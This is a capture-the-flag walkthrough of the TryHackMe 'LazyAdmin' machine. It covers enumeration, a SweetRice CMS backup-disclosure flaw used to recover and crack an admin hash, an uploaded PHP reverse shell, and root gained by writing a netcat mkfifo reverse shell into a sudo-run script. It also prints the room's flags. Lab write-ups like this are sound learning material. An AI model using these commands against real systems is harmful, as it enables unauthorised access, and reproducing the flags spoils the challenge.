# Enumeration
## Nmap

```
Nmap 7.91 scan initiated Thu Apr  8 21:41:49 2021 as: nmap -vvv -p 22,80 -A -oN nmap/initial 10.10.49.25
Nmap scan report for 10.10.49.25
Host is up, received conn-refused (0.13s latency).
Scanned at 2021-04-08 21:41:49 CDT for 12s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=
|   256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
## Ferox

```
ferox.log

403        9l       28w      276c http://10.10.49.25/server-status
301        9l       28w      312c http://10.10.49.25/content
301        9l       28w      316c http://10.10.49.25/content/inc
301        9l       28w      320c http://10.10.49.25/content/_themes
301        9l       28w      319c http://10.10.49.25/content/images
301        9l       28w      329c http://10.10.49.25/content/inc/mysql_backup
301        9l       28w      321c http://10.10.49.25/content/inc/font
301        9l       28w      315c http://10.10.49.25/content/js
301        9l       28w      322c http://10.10.49.25/content/inc/cache
301        9l       28w      323c http://10.10.49.25/content/attachment
301        9l       28w      315c http://10.10.49.25/content/as
301        9l       28w      328c http://10.10.49.25/content/_themes/default
301        9l       28w      319c http://10.10.49.25/content/as/lib
301        9l       28w      321c http://10.10.49.25/content/inc/lang
301        9l       28w      318c http://10.10.49.25/content/as/js
301        9l       28w      332c http://10.10.49.25/content/_themes/default/css
```

navigate to /content directory find CMS is SweetRice 

### searchsploit sweetrice
- find a couple .py scripts
```

SweetRice 0.5.3 - Remote File Inclusion                                                            | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                                         | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                                          | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                            | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                       | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                  | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                                              | php/webapps/14184.txt


```
- ### Backup Disclosure
	- used this to download the mysql backup file
	- ran strings on backup file
```
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";
s:25:\\"Lazy Admin&#039;
s Website\\";
s:6:\\"author\\";
s:10:\\"Lazy Admin\\";
s:5:\\"title\\";
s:0:\\"\\";
s:8:\\"keywords\\";
s:8:\\"Keywords\\";
s:11:\\"description\\";
s:11:\\"Description\\";
s:5:\\"admin\\";
s:7:\\"manager\\";
s:6:\\"passwd\\";
s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";
s:5:\\"close\\";

```

### Crackstation.net
42f749ade7f9e195bf475f37a44cafcb:Password123

### Enumerate Website

- Under Attachments found possible mysql creds
```
-   Database : mysql
-   Database Host : localhost
-   Database Port : 3306
-   Database Account : rice
-   Database Password : randompass

```
# Initial Access
## Ads
- ### create a new ad using Pentestmonkey's php [[revshell]]
	- navigate to http://lazyadmin.thm/content/inc/ads/shell.php


## On the box
- ### enumerate
- looks like there is only 1 user
```

www-data@THM-Chal:/$ ls -la home
total 12
drwxr-xr-x  3 root  root  4096 Nov 29  2019 .
drwxr-xr-x 23 root  root  4096 Nov 29  2019 ..
drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 itguy
```

```
www-data@THM-Chal:/$ ls -la home/itguy/
total 148
drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 .
drwxr-xr-x  3 root  root  4096 Nov 29  2019 ..
-rw-------  1 itguy itguy 1630 Nov 30  2019 .ICEauthority
-rw-------  1 itguy itguy   53 Nov 30  2019 .Xauthority
lrwxrwxrwx  1 root  root     9 Nov 29  2019 .bash_history -> /dev/null
-rw-r--r--  1 itguy itguy  220 Nov 29  2019 .bash_logout
-rw-r--r--  1 itguy itguy 3771 Nov 29  2019 .bashrc
drwx------ 13 itguy itguy 4096 Nov 29  2019 .cache
drwx------ 14 itguy itguy 4096 Nov 29  2019 .config
drwx------  3 itguy itguy 4096 Nov 29  2019 .dbus
-rw-r--r--  1 itguy itguy   25 Nov 29  2019 .dmrc
drwx------  2 itguy itguy 4096 Nov 29  2019 .gconf
drwx------  3 itguy itguy 4096 Nov 30  2019 .gnupg
drwx------  3 itguy itguy 4096 Nov 29  2019 .local
drwx------  5 itguy itguy 4096 Nov 29  2019 .mozilla
-rw-------  1 itguy itguy  149 Nov 29  2019 .mysql_history
drwxrwxr-x  2 itguy itguy 4096 Nov 29  2019 .nano
-rw-r--r--  1 itguy itguy  655 Nov 29  2019 .profile
-rw-r--r--  1 itguy itguy    0 Nov 29  2019 .sudo_as_admin_successful
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-clipboard.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-display.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-draganddrop.pid
-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-seamless.pid
-rw-------  1 itguy itguy   82 Nov 30  2019 .xsession-errors
-rw-------  1 itguy itguy   82 Nov 29  2019 .xsession-errors.old
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Desktop
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Documents
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Downloads
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Music
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Pictures
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Public
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Templates
drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Videos
-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
-rw-r--r--  1 itguy itguy 8980 Nov 29  2019 examples.desktop
-rw-rw-r--  1 itguy itguy   16 Nov 29  2019 mysql_login.txt
-rw-rw-r--  1 itguy itguy   38 Nov 29  2019 user.txt

```
- ### Interesting files
	- backup.pl
	- mysql_login.txt
	- user.txt
- ### user.txt
```
www-data@THM-Chal:/$ cat home/itguy/user.txt 
THM{63e5bce9271952aad1113b6f1ac28a07}

```
- ### mysql_login.txt
```
www-data@THM-Chal:/$ cat home/itguy/mysql_login.txt 
rice:randompass

```
- ### backup.pl
```
www-data@THM-Chal:/$ cat home/itguy/backup.pl       
#!/usr/bin/perl

system("sh", "/etc/copy.sh");

```
- ## sudo -l
	```bash
	www-data@THM-Chal:/$ sudo -l
	Matching Defaults entries for www-data on THM-Chal:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User www-data may run the following commands on THM-Chal:
	    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
	```

# Privilege Escalation
- ## /etc/copy.sh
	- modify with [[revshell]]

```bash
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.14.9.223 1235 >/tmp/
```

```bash
	
	ww-data@THM-Chal:~# cat /etc/copy.sh
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.14.9.223 1235 >/tmp/f
```
- # root shell
	```bash
	root@THM-Chal:~# cat root.txt
	cat root.txt
	THM{6637f41d0177b6f37cb20d775124699f}
	```

